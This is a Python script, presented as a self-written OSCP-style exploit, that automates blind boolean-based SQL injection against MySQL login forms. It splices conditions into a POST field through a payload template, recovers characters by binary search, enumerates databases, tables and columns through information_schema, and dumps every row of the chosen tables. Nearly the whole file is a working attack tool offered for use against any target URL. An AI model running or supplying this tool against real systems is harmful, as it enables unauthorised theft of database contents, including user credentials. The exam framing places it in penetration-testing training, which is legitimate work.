#!/usr/bin/env python3
# ---------------------------------------------------------------------------
# Blind boolean-based SQLi dumper (MySQL) - interactive, live rolling output
# Oracle = TRUE/FALSE difference in the HTTP response.
# Binary search on ASCII per character (~8 requests/char, 0-255 range).
# Flow: list DBs -> pick all/one -> list tables -> pick all/one -> dump rows.
# Values roll in char-by-char (sqlmap style); row data prints as an ASCII table.
# Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
# ---------------------------------------------------------------------------
import requests
import sys

# --- Interactive config ----------------------------------------------------
print("=== blind SQLi dumper ===")
URL          = input("Target URL                                   : ").strip()
INJ_FIELD    = input("Injectable POST field name (e.g. username)   : ").strip()
OTHER_FIELD  = input("Other POST field name (e.g. password)        : ").strip()
OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip()
# Template with [INJECT] where the boolean condition is spliced in.
# Example that worked in testing:  kitty' AND [INJECT]-- -
TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
# A string that appears ONLY when the query returns NO row (login failed).
# Its ABSENCE from the response = condition TRUE.
FALSE_MARKER = input("String shown only on FALSE/failed response   : ").strip()

# MySQL system schemas to skip when dumping "all" (still listed on screen)
SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]

session = requests.Session()

# --- Core oracle -----------------------------------------------------------
def oracle(condition):
    """Send one boolean condition, return True if the app signals TRUE."""
    payload = TEMPLATE.replace("[INJECT]", condition)
    r = session.post(URL, data={INJ_FIELD: payload, OTHER_FIELD: OTHER_VALUE})
    return FALSE_MARKER not in r.text

def extract_char(subquery, pos):
    """Binary search the byte value (0-255) of one character at position pos."""
    lo, hi = 0, 255
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"ascii(substring(({subquery}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract_string(subquery, label=None):
    """Pull a string char by char until a NULL/empty char (0) ends it.
    If label is given, redraw the growing value on one line (rolling output)."""
    out, pos = "", 1
    while True:
        val = extract_char(subquery, pos)
        if val == 0:                      # past end of string -> done
            break
        out += chr(val)
        if label is not None:
            sys.stdout.write(f"\r{label}{out}")   # \r rewrites the same line
            sys.stdout.flush()
        pos += 1
    if label is not None:
        sys.stdout.write("\n")
    return out

def extract_number(subquery):
    """Binary search a numeric value directly (used for row counts)."""
    lo, hi = 0, 1
    while oracle(f"({subquery})>{hi}"):     # grow the ceiling first
        hi *= 2
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({subquery})>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

# --- ASCII table renderer --------------------------------------------------
def render_table(headers, rows):
    """Print rows as an aligned ASCII table."""
    widths = [len(h) for h in headers]
    for row in rows:
        for i in range(len(headers)):
            cell = row[i] if i < len(row) else ""
            widths[i] = max(widths[i], len(cell))
    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    def fmt(cols):
        cells = [(cols[i] if i < len(cols) else "").ljust(widths[i]) for i in range(len(headers))]
        return "| " + " | ".join(cells) + " |"
    print("      " + bar)
    print("      " + fmt(headers))
    print("      " + bar)
    for row in rows:
        print("      " + fmt(row))
    print("      " + bar)

# --- Enumeration helpers ---------------------------------------------------
def get_databases():
    q = "SELECT group_concat(schema_name) FROM information_schema.schemata"
    s = extract_string(q, label="[*] databases: ")
    return s.split(",") if s else []

def get_tables(db):
    q = (f"SELECT group_concat(table_name) FROM information_schema.tables "
         f"WHERE table_schema='{db}'")
    s = extract_string(q, label=f"[*] tables in {db}: ")
    return s.split(",") if s else []

def get_columns(db, table):
    q = (f"SELECT group_concat(column_name) FROM information_schema.columns "
         f"WHERE table_schema='{db}' AND table_name='{table}'")
    s = extract_string(q, label=f"[*] columns in {db}.{table}: ")
    return s.split(",") if s else []

def dump_table(db, table):
    cols = get_columns(db, table)
    if not cols:
        print(f"      (no columns found for {db}.{table})")
        return
    # concat_ws joins columns with | ; 0x7c is hex for | (avoids quote issues).
    # Per-row LIMIT avoids group_concat's 1024-byte truncation on big tables.
    col_expr = "concat_ws(0x7c," + ",".join(cols) + ")"
    rows_n = extract_number(f"SELECT count(*) FROM {db}.{table}")
    print(f"      ({rows_n} row(s))")
    data = []
    for i in range(rows_n):
        row_q = f"SELECT {col_expr} FROM {db}.{table} LIMIT {i},1"
        raw = extract_string(row_q, label=f"    row {i}: ")   # live rolling
        data.append(raw.split("|"))
    print()
    render_table(cols, data)                                  # clean summary

# --- Interactive chooser ---------------------------------------------------
def choose(items, label):
    """Show a numbered list; return the full list (all) or a one-item list."""
    print(f"\nAvailable {label}s:")
    print("   0) ALL")
    for idx, it in enumerate(items, 1):
        print(f"   {idx}) {it}")
    while True:
        pick = input(f"Select {label} (number, 0=all): ").strip()
        if pick == "0":
            return items
        if pick.isdigit() and 1 <= int(pick) <= len(items):
            return [items[int(pick) - 1]]
        print("   invalid choice, try again.")

# --- Main walk -------------------------------------------------------------
def main():
    print("\n[*] Enumerating databases...")
    all_dbs = get_databases()
    print(f"[+] Found: {', '.join(all_dbs)}")

    candidates = [d for d in all_dbs if d not in SKIP_DBS] or all_dbs
    chosen_dbs = choose(candidates, "database")

    for db in chosen_dbs:
        print(f"\n[DB] {db}")
        tables = get_tables(db)
        if not tables:
            print("    (no tables)")
            continue
        # only prompt per-table when a single DB was chosen
        if len(chosen_dbs) == 1:
            tables = choose(tables, "table")

        for table in tables:
            print(f"  [TABLE] {db}.{table}")
            dump_table(db, table)

    print("\n[*] Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
